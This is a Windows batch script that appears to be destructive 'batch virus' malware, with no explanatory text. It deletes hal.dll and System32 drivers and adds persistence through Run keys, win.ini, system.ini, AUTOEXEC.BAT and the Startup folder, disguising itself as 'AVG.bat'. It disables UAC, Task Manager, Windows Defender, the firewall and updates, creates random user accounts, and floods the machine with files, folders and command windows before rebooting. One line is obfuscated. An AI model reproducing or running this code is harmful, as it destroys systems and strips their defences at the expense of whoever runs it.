:user
:folders
:files
:loop

DEL /F /S /Q /A "calc.exe"
start cmd.exe
goto loop
RUNDLL32 USER32.DLL,SwapMouseButton
date 22/08/2014
time 06:06:06
DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll"
@((( Echo Off > Nul ) & Break Off )
@Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
@Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul
@Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*"
)
nul >> %random%
goto files
mkdir %random%
goto folders
net user %random% /add
goto user
set Slash=\
if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
del %SystemDrive%%Slash%AUTOEXEC.BAT
copy %0 %SystemDrive%%Slash%AUTOEXEC.BAT
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
)
set a=AVG
copy %0 %windir%\%a%.bat
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.bat /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.bat /f > nul
copy %0 "%userprofile%\Start Menu\Programs\Startup"
set b=AVG
copy %0 %windir%\%b%.bat
echo [windows] >> %windir%\win.ini
echo run=%windir%\%b%.bat >> %windir%\win.ini
echo load=%windir%\%b%.bat >> %windir%\win.ini
echo [boot] >> %windir%\system.ini
echo shell=explorer.exe %b%.bat >> %windir%\system.ini
@Set RegistyEditCmd=Cmd /k Reg Add
@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
@%RegistyEditCmd% "%HiveSysKey%" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
@Echo off & @@Break Off
Ipconfig / release
%jUmP%E%nD%c%onFiG%h%IdE%o%P% h%aRv%%aRd%A%T%%cHe%cK%HappY%3D b%aLLo0Ns%Y%eS% m3Ga!?!
P%ReSs%%IE%AuS%ExPloR%e%r% > nul.%TempInternetRelease%
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
net stop "SDRSVC"
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "security center"
net stop sharedaccess
netsh firewall set opmode mode-disable
net stop "wuauserv"
shutdown /r
